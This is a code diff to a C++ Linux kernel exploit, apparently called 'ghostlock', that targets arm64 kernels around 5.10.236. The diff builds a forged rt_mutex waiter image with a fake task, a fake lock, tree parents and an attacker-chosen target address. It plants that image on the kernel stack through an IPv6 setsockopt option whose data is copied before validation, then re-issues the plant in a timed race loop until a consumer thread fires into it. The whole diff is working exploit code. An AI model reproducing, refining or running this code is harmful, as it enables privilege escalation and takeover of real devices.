@@ -16,7 +16,6 @@ using namespace ghostlock;
 
 namespace ghostlock::route {
     route::RouteStatus do_kernel5_fake_lock_route(const memory::WriteRequest *request) {
-        (void) request;
         route::RouteStatus status = {.code = ROUTE_RETRYABLE};
         profile::MulticastWaiterLayout layout =
                 session::g_exploit_session.profile.multicast_layout();
@@ -32,30 +31,67 @@ namespace ghostlock::route {
             pr_warning("multicast geometry incomplete (waiter_off not provided)\n");
             return status;
         }
+        if (!request) {
+            status.step = 57;
+            status.error_number = EINVAL;
+            status.code = ROUTE_FALLBACK_SAFE;
+            return status;
+        }
         const size_t stamp_size = *layout.buffer_size;
+        const size_t waiter_off = static_cast<size_t>(*layout.waiter_offset);
         /* VLA size comes from the validated profile geometry; the encode step
      * rejects an undersized buffer before any indexed write. */
     __extension__ unsigned char stamp[stamp_size]; // NOLINT(clang-analyzer-core.VLASize)
         memset(stamp, 0, sizeof(stamp));
-        if (!memory::encode_multicast_waiter(
-            {reinterpret_cast<std::byte *>(stamp), stamp_size},
-            static_cast<size_t>(*layout.waiter_offset), *layout.task_offset,
-            *layout.lock_offset,
-            (session::g_exploit_session.heap.current.fake_task), (session::g_exploit_session.heap.current.fake_lock))) {
+
+        /* v12.0: plant the FULL compact=2 waiter image (ghost words 2..11),
+         * the same field table the select route stamps — rb_erase needs the
+         * tree/pi parents, and the old task+lock-only stamp left those at 0
+         * so the walk derailed. Ghost word N sits at gsr word
+         * (waiter_off/8 + N). */
+        const uint64_t prio_word = static_cast<uint64_t>(kernel::FAKE_WAITER_PRIO);
+        const struct {
+            int32_t word;
+            uint64_t value;
+        } words[] = {
+                {2, (session::g_exploit_session.heap.current.fake_right)},
+                {3, 0},
+                {4, request->target},
+                {5, (session::g_exploit_session.heap.current.fake_right)},
+                {6, 0},
+                {7, request->target},
+                {8, (session::g_exploit_session.heap.current.fake_task)},
+                {9, (session::g_exploit_session.heap.current.fake_lock)},
+                {10, prio_word},
+                {11, 0},
+        };
+        bool encoded = true;
+        for (const auto &w: words) {
+            size_t byte = waiter_off + static_cast<size_t>(w.word) * 8;
+            if (byte + 8 > stamp_size) {
+                encoded = false;
+                break;
+            }
+            memcpy(stamp + byte, &w.value, sizeof(w.value));
+        }
+        if (!encoded) {
             status.step = 59;
             status.error_number = EOVERFLOW;
             status.userspace_clean = 1;
             status.kernel_disarmed = 1;
-            pr_warning("multicast byte injection rejected: waiter=%zu task=%zu "
-                       "lock=%zu buffer=%zu\n", static_cast<size_t>(*layout.waiter_offset),
-                       static_cast<size_t>(*layout.task_offset),
-                       static_cast<size_t>(*layout.lock_offset), stamp_size);
+            pr_warning("multicast word table overflows stamp: waiter_off=%zu "
+                       "buffer=%zu\n", waiter_off, stamp_size);
             return status;
         }
         uint16_t family = AF_UNSPEC;
         memcpy(stamp + 8, &family, sizeof(family));
 
-        int32_t fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
+        /* v12.0: the 5.10.236 upstream carrier — AF_INET6 + IPPROTO_IPV6
+         * opt 44 (group_source_req copy, 264B, verbatim, not rewritten on
+         * return). The sockaddr validation fails AFTER copy_from_user has
+         * already planted the 264B on this thread's kstack, so the EINVAL
+         * is expected and harmless. */
+        int32_t fd = socket(AF_INET6, SOCK_DGRAM | SOCK_CLOEXEC, 0);
         if (fd < 0) {
             status.step = 60;
             status.error_number = errno;
@@ -70,10 +106,32 @@ namespace ghostlock::route {
         session::g_exploit_session.race.route_delay_usec.store(0);
         errno = 0;
         int32_t stamp_result =
-                setsockopt(fd, IPPROTO_IP, MCAST_BLOCK_SOURCE, stamp, (socklen_t) sizeof(stamp));
+                setsockopt(fd, IPPROTO_IPV6, 44, stamp, (socklen_t) sizeof(stamp));
         status.step = 61;
         status.error_number = errno;
         session::g_exploit_session.race.consumer_go.store(1);
+        /* v12.0: re-stamp duty cycle (upstream: a single stamp is torn by the
+         * next syscall's own frames; GAP_US >= 300 gives the plant a resident
+         * fraction for the consumer to fire into). Re-issue until the
+         * consumer lands or the round budget expires. */
+        uint64_t freq = 0;
+        __asm__ volatile("mrs %0, cntfrq_el0" : "=r"(freq));
+        if (!freq) freq = 19200000;
+        const uint64_t gap_ticks = 300ULL * freq / 1000000ULL;
+        for (int32_t round = 0; round < 10000 &&
+                                session::g_exploit_session.race.consumer_calls.load() == 0;
+             round++) {
+            (void) setsockopt(fd, IPPROTO_IPV6, 44, stamp, (socklen_t) sizeof(stamp));
+            uint64_t start = 0;
+            __asm__ volatile("mrs %0, cntvct_el0" : "=r"(start));
+            while (true) {
+                uint64_t now = 0;
+                __asm__ volatile("mrs %0, cntvct_el0" : "=r"(now));
+                if (now - start >= gap_ticks) break;
+                if (session::g_exploit_session.race.consumer_calls.load() != 0) break;
+                __asm__ volatile("yield" ::: "memory");
+            }
+        }
         for (int32_t spin = 0; spin < 100000000 &&
                            session::g_exploit_session.race.consumer_calls.load() == 0; spin++)
             __asm__ volatile (
